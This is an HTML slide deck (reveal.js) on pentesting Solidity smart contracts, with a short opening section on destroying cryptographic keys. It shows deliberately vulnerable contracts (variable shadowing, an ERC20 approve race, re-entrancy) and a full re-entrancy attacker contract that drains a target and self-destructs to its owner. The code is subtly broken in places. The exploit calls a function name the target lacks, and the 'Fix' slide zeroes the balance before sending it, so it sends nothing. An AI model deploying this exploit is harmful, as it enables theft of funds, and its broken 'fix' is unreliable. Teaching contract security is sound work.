<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />

    <title>Pentesting Etherium</title>

    <link rel="stylesheet" href="./dist/reset.css" />
    <link rel="stylesheet" href="./dist/reveal.css" />
    <link rel="stylesheet" href="./dist/theme/solarized.css" id="theme" />

    <!-- Theme used for syntax highlighted code -->
    <link
      rel="stylesheet"
      href="./plugin/highlight/monokai.css"
      id="highlight-theme"
    />
  </head>
  <body>
    <div class="reveal">
      <div class="slides">
        <section>
          <h1>Pentesting Solidity</h1>
          <p>Aravinth Manivannan | @realaravinth</p>
        </section>
        <section>
          <section>
            <h2>Basic Cryptography Hygiene</h2>
          </section>
          <section>
            <h2>Key Rotation</h2>
            <ol>
              <h3>Key status</h3>
              <li>Generated (new, not to be used yet)</li>
              <li>Active (encrypt/decrypt)</li>
              <li>Inactive (decrypt-only)</li>
              <li>Retired (key irrevocably destroyed)</li>
            </ol>
          </section>
          <section>
            <h2>
              Disposing keys:
              <a
                href="https://www.gnu.org/software/coreutils/manual/html_node/shred-invocation.html#shred-invocation"
                target="_blank"
                >GNU shred</a
              >
            </h2>
            <pre class="bash">
              <code>
➜  tmp.DqwAhduJfe echo foo > top-secret
➜  tmp.DqwAhduJfe echo foo > top-secret
➜  tmp.DqwAhduJfe ls
top-secret
➜  tmp.DqwAhduJfe shred --iterations=7 -z -v top-secret
shred: top-secret: pass 1/8 (random)...
shred: top-secret: pass 2/8 (555555)...
shred: top-secret: pass 3/8 (ffffff)...
shred: top-secret: pass 4/8 (random)...
shred: top-secret: pass 5/8 (aaaaaa)...
shred: top-secret: pass 6/8 (000000)...
shred: top-secret: pass 7/8 (random)...
shred: top-secret: pass 8/8 (000000)...
              </code>
              </pre>
          </section>
          <section>
            <h2>
              Disposing keys:
              <a href="http://dban.org/" target="_blank">DBAN</a>
            </h2>
            <img src="./img/dban.jpg" alt="DBAN tool screenshot" />
          </section>
          <section>
            <h2>Disposing keys: Hammer and a nail</h2>

            <img
              src="./img/hammer.jpg"
              alt="hard disk with red and green markings to indicate where the nail must be driven into"
            />
          </section>
        </section>
        <section>
          <section>
            <h1>Pentesting Solidity</h1>
          </section>

          <section>
            <h2>Variable Shadowing: Motivation</h2>
            <pre class="rust">
            <code data-noescape data-line-numbers="28-32">#![allow(dead_code, unused_variables)]
use std::collections::HashMap;

#[derive(Default)]
struct HttpResponse {
    status: usize,
    data: Vec<u8>,
    headers: HashMap<String, String>,
}

struct Json {
    data: Vec<u8>,
}

impl HttpResponse {
    fn json(&self) -> Json {
        Json {
            data: self.data.clone(),
        }
    }
}

fn request(method: &str, url: &str) -> HttpResponse {
    HttpResponse::default()
}

fn main() {
    let response: HttpResponse = request(
                                    "GET",
                                    "https://example.com"
                                 );
    let response: Json = response.json();
}
            </code>
            </pre>
            <a
              href="https://play.rust-lang.org/?version=stable&mode=debug&edition=2021&gist=2f8b19d75b7fdc0b13ba601a5f85a361"
              target="_blank"
              >Open in Playground</a
            >
          </section>
          <section>
            <h2>Variable Shadowing: Solidity</h2>

            <pre class="solidity">
              <code data-line-numbers>//⚠️ Buggy code; don't use!
contract Suicidal {
  address owner;
  function suicide() public returns (address) {
    require(owner == msg.sender);
    selfdestruct(owner);
  }
}
contract C is Suicidal {
  address owner;
  function C() {
    owner = msg.sender;
  }
}
              </code>
              </pre>
          </section>
          <section>
            <h2>Variable Shadowing: King of the Hill</h2>

            <pre height="90%" class="solidity">
              <code height="90%" data-line-numbers>//⚠️ Buggy code; don't use!
contract Ownable {
    address public owner;
    function Ownable() public {owner = msg.sender;}
    modifier onlyOwner() {require(msg.sender == owner); _;
    }
}
contract CEOThrone is Ownable {
    address public owner;
    uint public largestStake;
    function Stake() public payable {
        if (msg.value > largestStake) {
            owner = msg.sender;
            largestStake = msg.value;
        }
    }
    function withdraw() public onlyOwner {
        msg.sender.transfer(this.balance);
    }
}
              </code>
              </pre>
          </section>

          <section>
            <h2>ERC 20 Race condition</h2>

            <pre height="90%" class="solidity">
              <code height="90%" data-line-numbers="25-35">//⚠️ Buggy code; don't use!
contract ERC20 {
    function totalSupply() constant returns (uint totalSupply);
    function balanceOf(address _owner) constant returns (uint balance);
    function transfer(address _to, uint _value) returns (bool success);
    function transferFrom(address _from, address _to, uint _value) returns (bool success);
    function approve(address _spender, uint _value) returns (bool success);
    function allowance(address _owner, address _spender) constant returns (uint remaining);
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}

contract RaceCondition{
    address private owner;
    uint public price;
    ERC20 token;

    function RaceCondition(uint _price, ERC20 _token)
        public{
        owner = msg.sender;
        price = _price;
        token = _token;
    }

    function buy(uint new_price) payable public {
        require(msg.value >= price);
        token.transferFrom(msg.sender, owner, price);
        price = new_price;
        owner = msg.sender;
    }

    function changePrice(uint new_price){
        require(msg.sender == owner);
        price = new_price; 
    }
}
              </code>
            </pre>
              <a
                href="https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/"
                target="_blank"
              >
                Detailed vunlerability report
              </a>
            
          </section>
          <section>
            <h2>Re-entrancy: Problem</h2>

            <pre height="90%" class="solidity">
              <code height="90%" data-line-numbers="13-16">//⚠️ Buggy code; don't use!
contract Fund {
    mapping(address => uint) shares;

    function getBalance(address u) constant returns(uint){
        return shares[u];
    }

    function addToBalance() payable{
        shares[msg.sender] += msg.value;
    }   

    function withdraw() public {
        if (payable(msg.sender).send(shares[msg.sender]))
            shares[msg.sender] = 0;
    }
}
              </code>
            </pre>

            
          </section>

          <section>
            <h2>Re-entrancy: Exploit</h2>

            <pre height="90%" class="solidity">
              <code height="90%" data-line-numbers="16-27">
contract ReentranceExploit {
  bool public attackModeIsOn=false; 
    address public vulnerable_contract;
    address public owner;

    function ReentranceExploit() public{
        owner = msg.sender;
    }

    function deposit(address _vulnerable_contract) public payable{
        vulnerable_contract = _vulnerable_contract ;
        require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_attack() public{
        attackModeIsOn = true;
        require(vulnerable_contract.call(bytes4(sha3("withdrawBalance()"))));
    }  

    function () public payable{
        if (attackModeIsOn){
            attackModeIsOn = false;
                require(vulnerable_contract.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function get_money(){
        suicide(owner);
    }

}
              </code>
            </pre>



          </section>

          <section>
            <h2>Re-entrancy: Fix</h2>

            <pre height="90%" class="solidity">
              <code height="90%" data-line-numbers="13-16">
contract Fund {
    mapping(address => uint) shares;

    function getBalance(address u) constant returns(uint){
        return shares[u];
    }

    function addToBalance() payable{
        shares[msg.sender] += msg.value;
    }   

    function withdraw() public {
        shares[msg.sender] = 0;
        payable(msg.sender).send(shares[msg.sender])
    }
}
              </code>
            </pre>
            <p></p>

            
          </section>

        </section>
        <section>
          <h2>References</h2>
          <ol>
            <li>
              All solidity source code snippets are obtained from
              <a
                href="https://github.com/crytic/not-so-smart-contracts"
                target="_blank"
                >crytic/not-so-smart-contracts</a
              >. Copy rights belong to its authors.
            </li>
            <li>
              <a
                href="https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/"
                target="_blank"
              >
                <code>approve/transferFrom</code> race codition vunlerability
                report
              </a>
            </li>
          </ol>
        </section>
      </div>
    </div>

    <script src="./dist/reveal.js"></script>
    <script src="./plugin/notes/notes.js"></script>
    <script src="./plugin/markdown/markdown.js"></script>
    <script src="./plugin/highlight/highlight.js"></script>
    <script>
      // More info about initialization & config:
      // - https://revealjs.com/initialization/
      // - https://revealjs.com/config/
      Reveal.initialize({
        hash: true,
        highlight: {
          beforeHighlight: (hljs) => hljs.registerLanguage(/*...*/),
        },

        // Learn about plugins: https://revealjs.com/plugins/
        plugins: [RevealMarkdown, RevealHighlight, RevealNotes],
      });
      document
        .querySelectorAll("img")
        .forEach((img) =>
          img.addEventListener("click", (e) =>
            window.location.assign(e.target.src)
          )
        );
    </script>
    <style></style>
  </body>
</html>
